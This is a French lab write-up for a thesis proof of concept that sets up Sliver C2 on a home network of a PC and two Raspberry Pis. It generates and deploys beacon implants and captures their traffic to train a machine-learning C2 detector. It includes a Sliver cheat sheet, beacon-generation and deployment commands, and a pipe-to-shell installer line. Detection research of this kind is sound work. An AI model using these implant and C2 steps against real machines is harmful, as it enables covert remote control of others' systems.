# Configuration réseau et installation Sliver C2 — POC Sonde C2
## Recap complet : réseau, outils Pi 5, et serveur Sliver

---

## Architecture finale

```
PC Windows (WSL2)
├── WiFi → Internet (partagé via ICS Windows)
└── Ethernet 7 (192.168.137.1) → Switch 9€
                                    ├── Pi 5 — Sonde    (192.168.137.2)
                                    └── Pi 3 — Beacon   (192.168.137.3)
```

---

## Matériel utilisé

- PC Windows avec WSL2
- 1 switch basique 9€
- 3 câbles ethernet
- Raspberry Pi 5 (carte microSD 128 Go)
- Raspberry Pi 3 (carte microSD 16 Go)
- 1 écran HDMI + 1 clavier USB (pour la config initiale des Pi)

---

## PARTIE 1 — Configuration réseau

### Étape 1 — Flash des cartes microSD

Avec **Raspberry Pi Imager** :

**Pi 5 (sonde) :**
- OS : Raspberry Pi OS Lite 64-bit
- Hostname : `pi5-sonde`
- Utilisateur : `sonde`
- SSH activé (mot de passe)

**Pi 3 (beacon) :**
- OS : Raspberry Pi OS Lite 64-bit
- Hostname : `pi3-beacon`
- Utilisateur : `beacon`
- SSH activé (mot de passe)

---

### Étape 2 — Partage de connexion Internet Windows (ICS)

Cette étape permet aux Pi d'avoir accès à internet via le PC, et configure automatiquement Ethernet 7 en `192.168.137.1`.

1. `Win + R` → `ncpa.cpl` → Entrée
2. Clic droit sur **Wi-Fi** → **Propriétés**
3. Onglet **Partage**
4. Cocher **"Autoriser d'autres utilisateurs du réseau à se connecter via la connexion Internet de cet ordinateur"**
5. Dans le menu déroulant, sélectionner **Ethernet 7**
6. Cliquer **OK** puis **Oui** sur la popup de confirmation

Windows configure automatiquement Ethernet 7 avec l'IP `192.168.137.1`.

Vérification dans PowerShell :
```powershell
ipconfig
# Ethernet 7 doit afficher : 192.168.137.1
```

---

### Étape 3 — Configuration IP statique sur les Pi

Les Pi utilisent **NetworkManager** (pas dhcpcd) sur les versions récentes de Raspberry Pi OS.

Connecte un écran HDMI + clavier USB sur chaque Pi.

#### Passer le clavier en AZERTY

```bash
sudo loadkeys fr
```

#### Sur le Pi 5 (sonde)

```bash
sudo nmcli con mod "Wired connection 1" ipv4.addresses 192.168.137.2/24 ipv4.gateway 192.168.137.1 ipv4.dns 8.8.8.8 ipv4.method manual
sudo nmcli con up "Wired connection 1"
```

Vérification :

```bash
ip addr show eth0
# Doit afficher : inet 192.168.137.2/24

ping 192.168.137.1
# Doit répondre
```

#### Sur le Pi 3 (beacon)

```bash
sudo nmcli con mod "Wired connection 1" ipv4.addresses 192.168.137.3/24 ipv4.gateway 192.168.137.1 ipv4.dns 8.8.8.8 ipv4.method manual
sudo nmcli con up "Wired connection 1"
```

Vérification :

```bash
ip addr show eth0
# Doit afficher : inet 192.168.137.3/24

ping 192.168.137.1
# Doit répondre
```

---

### Étape 4 — Activer SSH sur les Pi

Sur chaque Pi :

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
sudo systemctl status ssh
```

---

### Étape 5 — Test de connectivité

#### Depuis les Pi vers le PC

```bash
ping 192.168.137.1
# Doit répondre
```

#### Test internet depuis les Pi

```bash
ping 8.8.8.8
# Doit répondre (internet via le partage de connexion Windows)
```

#### Depuis le PC vers les Pi

SSH via WSL (PowerShell Windows peut être bloqué par le firewall, sauf une fois le VPN désactivé) :

```bash
ssh sonde@192.168.137.2    # Pi 5
ssh beacon@192.168.137.3   # Pi 3
```

---

### Adresses MAC des Pi (identifiées avec Wireshark)

- **Pi 5** : `d8:3a:dd:bf:3c:7a`
- **Pi 3** : `b8:27:eb:xx:xx:xx` (famille Raspberry Pi 3)

---

## PARTIE 2 — Installation des outils sur le Pi 5 (sonde)

Toutes les commandes ci-dessous sont exécutées en SSH sur le Pi 5 :

```bash
ssh sonde@192.168.137.2
```

### Étape 1 — Mise à jour du système

```bash
sudo apt update && sudo apt upgrade -y
```

### Étape 2 — Installation des outils système

```bash
sudo apt install -y tshark python3-pip python3-venv git
```

Autoriser la capture réseau sans droits root :

```bash
sudo usermod -aG wireshark sonde
sudo dpkg-reconfigure wireshark-common
# Répondre "Oui" à la question sur les non-superutilisateurs
newgrp wireshark
```

### Étape 3 — Création de la structure du projet

```bash
mkdir -p /home/sonde/sonde_c2/{captures,dataset,models,logs}
cd /home/sonde/sonde_c2
```

### Étape 4 — Environnement Python (venv)

```bash
python3 -m venv venv
source venv/bin/activate
pip install pyshark pandas scikit-learn joblib flask numpy
```

Vérification :

```bash
python3 -c "import pyshark, sklearn, flask; print('OK')"
# Doit afficher : OK
```

### Étape 5 — Déploiement des scripts Python

4 scripts créés directement sur le Pi 5 via `cat > fichier.py << 'EOF' ... EOF` en SSH :

- `extract_features.py` — extraction des features réseau depuis un pcap (intervalles, tailles, etc.)
- `build_dataset.py` — construction du dataset à partir des captures C2 et légitimes
- `detect_live.py` — détection en temps réel avec le modèle ML entraîné
- `dashboard.py` — interface web Flask affichant les alertes en direct

Vérification :

```bash
ls -la /home/sonde/sonde_c2/*.py
# Doit afficher les 4 fichiers .py
```

---

## PARTIE 3 — Installation et démarrage de Sliver C2 (sur le PC)

### Problème rencontré : WSL2 en mode NAT (par défaut)

Sliver est installé **dans WSL**, recommandé par la documentation officielle (Linux). Mais en mode réseau par défaut, **WSL2 utilise un NAT isolé** : son IP interne (ex. `172.22.x.x`) n'est pas joignable depuis le reste du réseau local (les Pi). Plusieurs contournements ont été testés sans succès :

- `netsh interface portproxy` : fonctionne pour un simple `nc`/TCP brut, mais **casse les connexions TLS persistantes** de Sliver (erreurs `EOF` après envoi des données) — abandonné.
- Ajout d'une route statique sur le Pi 3 vers le réseau WSL + IP forwarding Windows : ne fonctionne pas, le NAT WSL2 est conçu à sens unique (sortant uniquement) même avec le forwarding Windows activé — abandonné.
- Sliver pour Windows natif : le `.exe` téléchargé n'était pas un binaire valide (mauvais fichier récupéré depuis GitHub) — abandonné, et de toute façon Linux est l'environnement recommandé pour Sliver.

### Solution retenue : mode réseau "mirrored" de WSL2

Le mode **mirrored networking** (disponible sur Windows 11 22H2+) fait partager directement les interfaces réseau de Windows avec WSL — l'IP de WSL devient alors identique à celle de Windows sur le réseau local, sans NAT.

#### Étape 1 — Créer/éditer le fichier de configuration WSL

```powershell
notepad $env:USERPROFILE\.wslconfig
```

Contenu du fichier :

```ini
[wsl2]
networkingMode=mirrored
dnsTunneling=true
firewall=true
autoProxy=true
```

#### Étape 2 — Autoriser le firewall Hyper-V pour les connexions entrantes

PowerShell en administrateur :

```powershell
Set-NetFirewallHyperVVMSetting -Name '{40E0AC32-46A5-438A-A0B2-2B479E8F2E90}' -DefaultInboundAction Allow
```

#### Étape 3 — Mettre à jour WSL

```powershell
wsl --update
```

> Note : si une distro Linux installée précédemment via le Microsoft Store n'apparaît pas dans `wsl --list --verbose` (problème rencontré ici), il est plus fiable de réinstaller une distro propre via la méthode officielle plutôt que de chercher à réparer l'ancienne :
> ```powershell
> wsl --install
> ```
> (installe Ubuntu par défaut, demande la création d'un user/password Linux)

#### Étape 4 — Démarrer la distro et vérifier le mode mirrored

```powershell
wsl -d Ubuntu
```

Dans WSL :

```bash
hostname -I
```

**Résultat attendu (et obtenu)** : l'IP `192.168.137.1` apparaît dans la liste — c'est la même IP que Windows sur Ethernet 7. Le mode mirrored fonctionne.

---

### Installation de Sliver dans la distro WSL

```bash
sudo apt update
curl https://sliver.sh/install | sudo bash
```

Ça installe `sliver-server` (dans `/root/`) et le client `sliver` (dans `/usr/local/bin/`).

### Démarrage du serveur Sliver

```bash
/root/sliver-server daemon &
sleep 5
sliver
```

Le prompt `sliver >` doit apparaître.

### Démarrer le listener HTTPS

```
sliver > https
```

Doit afficher :
```
[*] Starting HTTPS :443 listener ...
[*] Successfully started job #1
```

Vérifier les jobs actifs :

```
sliver > jobs
```

> Le listener DNS (`dns --domains attacker.local`) a été testé mais s'arrête immédiatement (conflit de port probable). Le listener HTTPS suffit pour le POC — c'est d'ailleurs plus représentatif d'un C2 moderne basé sur du trafic chiffré.

### Validation de bout en bout

Depuis le Pi 3, vérifier que le port est joignable :

```bash
nc -zv 192.168.137.1 443
# Doit afficher : succeeded!
```

Générer un beacon, le copier sur le Pi 3, le lancer, puis vérifier côté serveur :

```
sliver > beacons
```

**Résultat attendu (et obtenu)** :
```
ID         Name              Transport   Hostname     Username   Operating System   Last Check-In   Next Check-In
========== ================= =========== ============ ========== ================== =============== ===============
73768664   AGREEABLE_BOOTS   http(s)     pi3-beacon   beacon     linux/arm64        0s              30s
```

Le beacon check-in correctement toutes les 30 secondes — la chaîne réseau complète (Pi 3 → switch → PC/WSL mirrored → Sliver) fonctionne.

---

## Cheat sheet Sliver C2

### Connexion au serveur

```bash
sliver
# Ouvre le client interactif, prompt "sliver >"
```

### Démarrage du serveur (si pas déjà lancé)

```bash
/root/sliver-server daemon &
sleep 5
sliver
```

### Listeners

```
https                                    # Démarre un listener HTTPS sur le port 443
http --lport 80                          # Démarre un listener HTTP sur un port custom
dns --domains attacker.local             # Démarre un listener DNS (port 53, conflit possible)
jobs                                     # Liste les listeners actifs
jobs -k <ID>                             # Arrête un listener par son ID
```

### Génération de beacons

```
generate beacon --http <IP> --arch arm64 --os linux --seconds 30 --jitter 0 --save /root/beacons/
```

| Option | Rôle |
|---|---|
| `--http <IP>` | IP du serveur Sliver à contacter (ici 192.168.137.1) |
| `--arch arm64` | Architecture cible (Raspberry Pi = arm64) |
| `--os linux` | OS cible |
| `--seconds N` | Intervalle de callback en secondes |
| `--jitter N` | Variation aléatoire de l'intervalle (0 = parfaitement régulier) |
| `--save <chemin>` | Dossier de sauvegarde du binaire généré |

Profils utilisés dans le POC :

```
# Beacon régulier (callback toutes les 30s, pas de variation)
generate beacon --http 192.168.137.1 --arch arm64 --os linux --seconds 30 --jitter 0 --save /root/beacons/

# Beacon avec jitter (callback ~30s, variation de 15s)
generate beacon --http 192.168.137.1 --arch arm64 --os linux --seconds 30 --jitter 15 --save /root/beacons/

# Beacon lent (callback toutes les 2 minutes, variation de 1 minute)
generate beacon --http 192.168.137.1 --arch arm64 --os linux --seconds 120 --jitter 60 --save /root/beacons/
```

Sliver donne un nom de code aléatoire à chaque binaire généré (ex : `AGREEABLE_BOOTS`) — bien renommer après génération pour s'y retrouver :

```bash
mv /root/AGREEABLE_BOOTS /root/beacons/beacon_regular
```

Le chemin réel du binaire généré peut différer du message affiché par Sliver (`Implant saved to ...`) — si le fichier n'est pas trouvé à cet endroit, chercher avec :

```bash
find / -name "<NOM_DU_BEACON>" 2>/dev/null
```

### Gestion des beacons connectés

```
beacons                                  # Liste les beacons qui se sont connectés au serveur
beacons rm <ID>                          # Supprime un beacon de la liste
use <ID>                                 # Interagir avec un beacon spécifique
tasks                                    # Voir les tâches en attente pour le beacon actif
```

### Copier un beacon sur le Pi 3

Depuis WSL (utiliser `sudo` si le fichier appartient à root) :

```bash
sudo scp /root/beacons/beacon_regular beacon@192.168.137.3:/home/beacon/
ssh beacon@192.168.137.3 "chmod +x /home/beacon/beacon_regular"
```

### Lancer le beacon sur le Pi 3

```bash
ssh beacon@192.168.137.3
./beacon_regular &
```

### Vérifier qu'un beacon tente bien de se connecter (debug réseau)

Sur le Pi 5 (qui voit tout le trafic du switch) :

```bash
sudo tshark -i eth0 -f "host 192.168.137.3 and port 443"
```

Et test direct de connectivité TCP depuis le Pi 3 :

```bash
nc -zv 192.168.137.1 443
```

### Commandes utiles diverses

```
help                                     # Liste toutes les commandes disponibles
sessions                                 # Liste les sessions actives (mode session, différent de beacon)
exit                                     # Quitte le client Sliver (le serveur continue de tourner)
```

---

## PARTIE 4 — Captures de trafic (C2 et légitime)

### Problème découvert : un switch non managé ne permet pas le sniffing passif

Le plan initial était de capturer le trafic Pi3 ↔ PC **depuis le Pi 5**, positionné comme observateur passif sur le même switch. Ça ne fonctionne pas avec un switch grand public (9€, non managé) : **un switch transmet les trames uniquement au port de destination** (apprentissage par adresse MAC), pas en broadcast à tous les ports comme le ferait un hub. Le Pi 5 ne fait pas partie de la conversation Pi3↔PC, donc il ne voit jamais ce trafic — confirmé par `tshark` qui ne capturait que le trafic SSH PC↔Pi5 (dont le Pi 5 est lui-même partie prenante), jamais le trafic du beacon.

Pour observer du trafic tiers sur un switch non managé, il faudrait :
- un switch avec port mirroring/SPAN configuré (pas disponible ici), ou
- un hub à la place du switch (diffuse tout à tous les ports, matériel rare aujourd'hui), ou
- un nœud en coupure (bridge) entre les deux machines à observer (nécessite 2 interfaces réseau sur le nœud observateur)

Le Pi 5 n'ayant qu'un seul port Ethernet (pas de second port disponible pour un bridge), **la capture a été déplacée sur le PC**, qui est lui-même un point de passage obligé du trafic puisqu'il héberge le serveur Sliver. C'est un changement d'architecture mineur par rapport au plan initial (la sonde capture sur le nœud serveur plutôt que sur un nœud tiers passif), mais qui reste représentatif : de nombreuses sondes réseau réelles s'appuient sur des points de capture intégrés aux passerelles plutôt que sur du mirroring dédié.

### Méthode de capture retenue (sur le PC, en WSL mode mirrored)

Identifier l'interface réseau correspondant à `192.168.137.1` (Ethernet 7 côté Windows, visible aussi dans WSL grâce au mode mirrored) :

```bash
ip addr
# Repérer l'interface avec inet 192.168.137.1/24 (ex: eth3)
```

Installer tshark si besoin dans la distro WSL :

```bash
sudo apt update
sudo apt install -y tshark
```

### Scénario 1 — Beacon régulier (30s, jitter=0)

Sur le Pi 3, lancer uniquement ce beacon :

```bash
ssh beacon@192.168.137.3 "pkill -9 beacon_jitter beacon_lent beacon_test beacon_debug beacon_debug2 2>/dev/null; cd /home/beacon && nohup ./beacon_regular > /dev/null 2>&1 &"
```

Sur le PC, capturer :

```bash
sudo tshark -i eth3 -f "host 192.168.137.3" -w /tmp/c2_regular.pcap
```

Laisser tourner 3 minutes, `Ctrl+C`. **Résultat obtenu : 191 paquets.**

### Scénario 2 — Beacon jitter (30s, jitter=15s)

```bash
ssh beacon@192.168.137.3 "pkill -9 beacon_regular; cd /home/beacon && nohup ./beacon_jitter > /dev/null 2>&1 &"
```

```bash
sudo tshark -i eth3 -f "host 192.168.137.3" -w /tmp/c2_jitter.pcap
```

**Résultat obtenu : 226 paquets.**

### Scénario 3 — Beacon lent (120s, jitter=60s)

```bash
ssh beacon@192.168.137.3 "pkill -9 beacon_jitter; cd /home/beacon && nohup ./beacon_lent > /dev/null 2>&1 &"
```

```bash
sudo tshark -i eth3 -f "host 192.168.137.3" -w /tmp/c2_lent.pcap
```

Laisser tourner 5 minutes (intervalle plus long, il faut plusieurs cycles complets). **Résultat obtenu : 164 paquets.**

### Scénario 4 — Trafic légitime (référence)

Arrêter tous les beacons :

```bash
ssh beacon@192.168.137.3 "pkill -9 beacon_lent"
```

> Piège rencontré : le Pi 3 a perdu l'accès à internet pendant cette session (DNS résolvant rien, `ping 8.8.8.8` en 100% de perte), alors que le réseau local PC↔Pi3 fonctionnait. Cause : le partage de connexion Windows (ICS) s'était corrompu après les multiples redémarrages WSL. **Solution** : décocher puis recocher la case de partage de connexion dans Propriétés Wi-Fi → onglet Partage, en sélectionnant bien Ethernet 7 — force Windows à reconstruire le NAT.

Script de simulation de navigation (`simu.sh`), créé directement sur le Pi 3 :

```bash
while true; do
  for site in google.com wikipedia.org github.com stackoverflow.com bbc.com lemonde.fr reddit.com youtube.com amazon.com openai.com; do
    curl -s -o /dev/null "https://$site"
    sleep 0.$((RANDOM % 9 + 1))
  done
  sleep $((RANDOM % 5 + 1))
done
```

```bash
chmod +x simu.sh
./simu.sh
```

Capture en parallèle sur le PC :

```bash
sudo tshark -i eth3 -f "host 192.168.137.3" -w /tmp/legit_browsing.pcap
```

### Sauvegarde des captures

```bash
mkdir -p ~/poc_captures
cp /tmp/c2_regular.pcap /tmp/c2_jitter.pcap /tmp/c2_lent.pcap /tmp/legit_browsing.pcap ~/poc_captures/
```

Copie vers Windows pour un accès facile hors WSL :

```bash
mkdir -p "/mnt/c/Users/<user>/Documents/poc_captures"
sudo bash -c 'cp -r ~/poc_captures/* "/mnt/c/Users/<user>/Documents/poc_captures/"'
```

**Les 4 fichiers de capture sont disponibles dans `Documents\poc_captures\` sur le PC :**

| Fichier | Taille | Scénario |
|---|---|---|
| `c2_regular.pcap` | 70 528 octets | Beacon régulier (30s, jitter=0) |
| `c2_jitter.pcap` | 81 464 octets | Beacon jitter (30s, jitter=15s) |
| `c2_lent.pcap` | 59 168 octets | Beacon lent (120s, jitter=60s) |
| `legit_browsing.pcap` | 22 008 octets | Trafic web légitime (référence) |

---

## Notes importantes

- **dhcpcd n'existe pas** sur les versions récentes de Raspberry Pi OS — utiliser `nmcli` à la place
- **DualServer (DHCP/DNS) ne fonctionne pas correctement sous Windows** — abandonné au profit du partage de connexion Windows natif (ICS)
- **SSH depuis PowerShell Windows** peut être bloqué par le firewall ou un VPN actif — désactiver le VPN (ex: ProtonVPN) résout généralement le problème
- **WSL2 en mode NAT (par défaut) isole son réseau** — inutilisable pour un serveur C2 qui doit recevoir des connexions depuis le réseau local. Le **mode mirrored** (`.wslconfig` + `networkingMode=mirrored`) résout ce problème en partageant directement les interfaces réseau de Windows avec WSL
- **`netsh portproxy` casse les connexions TLS persistantes** (type Sliver) — utile seulement pour du TCP simple, pas pour du C2 chiffré
- Si une distro WSL installée via le Microsoft Store n'apparaît pas dans `wsl --list --verbose`, il est plus rapide de réinstaller proprement avec `wsl --install` que de chercher à la réparer
- **Un switch non managé ne permet pas le sniffing passif d'un trafic tiers** — il ne transmet les trames qu'au port de destination, pas en broadcast. Capturer depuis le nœud serveur (ici le PC) plutôt que depuis un nœud tiers passif (ici le Pi 5) si pas de port mirroring disponible
- **Le partage de connexion Windows (ICS) peut se corrompre silencieusement** après des redémarrages WSL répétés — symptôme : le réseau local fonctionne mais plus l'accès internet pour les machines clientes. Solution : décocher/recocher la case de partage dans Propriétés Wi-Fi
- **Wireshark/tshark** permet de vérifier que les paquets transitent bien sur le réseau — utile pour déboguer à la fois le DHCP et les tentatives de connexion C2
- Le filtre Wireshark utile pour déboguer le DHCP : `udp.port == 67 or udp.port == 68`
- Le partage de connexion Windows (ICS) se désactive si Windows redémarre — il faut le réactiver manuellement
- Sliver pour Windows natif n'a pas fonctionné (binaire invalide téléchargé) — l'installation WSL (avec mode mirrored) est la solution retenue

---

## Tableau récapitulatif

| Appareil | IP              | Login  | Rôle                             |
|----------|-----------------|--------|-----------------------------------|
| PC       | 192.168.137.1   | -      | Serveur Sliver C2 (WSL mirrored) + point de capture |
| Pi 5     | 192.168.137.2   | sonde  | Sonde réseau (tshark + ML) — environnement prêt, capture déplacée sur PC pour ce POC |
| Pi 3     | 192.168.137.3   | beacon | Beacon Sliver (attaquant simulé)  |

---

## État d'avancement à ce stade

- [x] Réseau physique fonctionnel (PC ↔ switch ↔ Pi5 + Pi3)
- [x] SSH fonctionnel sur les deux Pi
- [x] Environnement Python + outils capture installés sur le Pi 5
- [x] Scripts Python du POC déployés sur le Pi 5
- [x] Sliver C2 installé avec WSL en mode mirrored, listener HTTPS actif
- [x] Génération et déploiement des 3 profils de beacon définitifs (régulier/jitter/lent) sur le Pi 3
- [x] Captures de trafic C2 (3 scénarios) et trafic légitime (référence) — 4 fichiers .pcap obtenus
- [x] Captures sauvegardées et accessibles depuis Windows (`Documents\poc_captures\`)
- [ ] Construction du dataset (`build_dataset.py` à exécuter sur les 4 .pcap)
- [ ] Entraînement du modèle ML sur les vraies données (`train_model.py`, déjà testé avec données synthétiques)
- [ ] Déploiement de la sonde en temps réel + dashboard (`detect_live.py` / `dashboard.py`, déjà déployés sur le Pi 5)
- [ ] Tests d'évasion pour mesures de thèse (5 scénarios : régulier, jitter, lent, DGA simulé, beacon+trafic légitime simultané)

### Pour continuer sans les Pi (travail à distance)

Les 4 fichiers `.pcap` sont exploitables avec `extract_features.py` et `build_dataset.py` sur n'importe quelle machine avec Python — pas besoin des Pi physiquement pour :
1. Construire le dataset à partir des captures existantes
2. Entraîner et comparer les modèles ML (`train_model.py`)
3. Avancer sur la rédaction de la thèse (section III, résultats)

Les Pi seront nécessaires pour : refaire de nouvelles captures, tester le déploiement live de la sonde (`detect_live.py`/`dashboard.py` sur le Pi 5), et les tests d'évasion finaux.
